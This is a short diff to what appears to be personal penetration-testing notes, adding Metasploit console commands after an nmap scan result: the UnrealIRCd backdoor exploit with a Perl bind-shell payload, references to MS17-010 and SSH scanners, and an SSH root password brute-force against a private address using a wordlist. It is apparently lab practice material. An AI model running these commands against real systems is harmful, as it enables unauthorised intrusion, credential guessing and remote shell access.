@@ -36,3 +36,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
 root@raspberrypi:~/nuclei-templates/technologies/nginx# 
 ```
+##
+```
+msfconsole
+
+#auxiliary/scanner/ssh/ssh_login_pubkey
+#use auxiliary/scanner/smb/smb_ms17_010
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set payload cmd/unix/bind_perl
+##
+search ssh_login
+use auxiliary/scanner/ssh/ssh_login
+set username root
+set userpass_file /usr/share/wordlists/root_userpass.txt
+set rhosts 192.168.1.121
+```
